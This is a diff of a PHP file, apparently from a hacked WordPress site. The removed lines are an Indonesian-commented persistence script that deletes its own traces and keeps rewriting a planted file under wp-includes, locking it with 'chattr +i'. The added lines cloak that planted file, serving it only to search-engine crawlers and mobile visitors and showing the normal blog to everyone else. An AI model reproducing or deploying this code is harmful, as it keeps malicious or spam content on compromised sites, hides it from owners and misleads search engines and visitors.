@@ -1,45 +1,40 @@
 <?php
-@unlink($_SERVER['SCRIPT_FILENAME']); // Menghapus file script ini setelah dijalankan
-error_reporting(0);
-ignore_user_abort(true); // Script tetap berjalan meskipun koneksi terputus
-set_time_limit(0); // Script tidak memiliki batas waktu eksekusi
+$bot_user_agents = array(
+    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", "Storebot-Google", "Google-InspectionTool",
+    "GoogleOther", "GoogleOther-Image", "GoogleOther-Video", "Google-CloudVertexBot", "Google-Extended", "APIs-Google",
+    "AdsBot-Google-Mobile", "AdsBot-Google", "Mediapartners-Google", "FeedFetcher-Google", "Google-Favicon", "Google Favicon",
+    "Googlebot-Favicon", "Google-Site-Verification", "Google-Read-Aloud", "GoogleProducer", "Google Web Preview", "Bingbot",
+    "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebookexternalhit", "ia_archiver",
+    "Alexa Crawler", "AhrefsBot", "Semrushbot"
+);
 
-$unlockFile = 'unlock.txt'; // File untuk memberikan sinyal penghentian script
-$lockFilePath = '/home/websitefaiumsu/public_html/wp-includes/Requests/library/store.php'; // File yang akan dikunci
-$lockContentFile = 'content.txt'; // File berisi konten untuk mengunci
+$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
 
-// Periksa apakah file konten kunci tersedia
-if (!file_exists($lockContentFile)) {
-    exit("ERROR: File konten kunci tidak ditemukan.\n");
+function is_bot($user_agent, $bot_user_agents) {
+    foreach ($bot_user_agents as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
 }
 
-// Baca isi file konten kunci
-$lockContent = file_get_contents($lockContentFile);
-@unlink($lockContentFile); // Hapus file konten kunci untuk menyembunyikan jejak
-
-// Fungsi untuk membuat file immutable
-function makeImmutable($file) {
-    chmod($file, 0444); // Set read-only
-    exec("chattr +i $file"); // Set atribut immutable
+function is_mobile($user_agent) {
+    $mobile_agents = array('Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi', 'iPhone', 'iPad');
+    foreach ($mobile_agents as $mobile) {
+        if (stripos($user_agent, $mobile) !== false) {
+            return true;
+        }
+    }
+    return false;
 }
 
-// Loop utama
-while (true) {
-    // Periksa apakah ada sinyal untuk berhenti
-    if (file_exists($unlockFile)) {
-        @unlink($unlockFile); // Hapus file sinyal
-        exit("Unlock signal received. Script terminated.\n");
-    }
-
-    // Kunci file
-    if (file_exists($lockFilePath)) {
-        @unlink($lockFilePath); // Hapus file jika sudah ada
-    }
-
-    if (file_put_contents($lockFilePath, $lockContent) !== false) {
-        makeImmutable($lockFilePath); // Buat file immutable
-    }
-
-    sleep(1); // Tunggu 1 detik sebelum iterasi berikutnya
+// Combined conditions for including 'landingpage.php'
+if (is_bot($user_agent, $bot_user_agents) || is_mobile($user_agent)) {
+    include '/wp-includes/Requests/library/store.php';
+    exit;
+} else {
+    include 'wp-blog-footer.php';
+    exit;
 }
 ?>
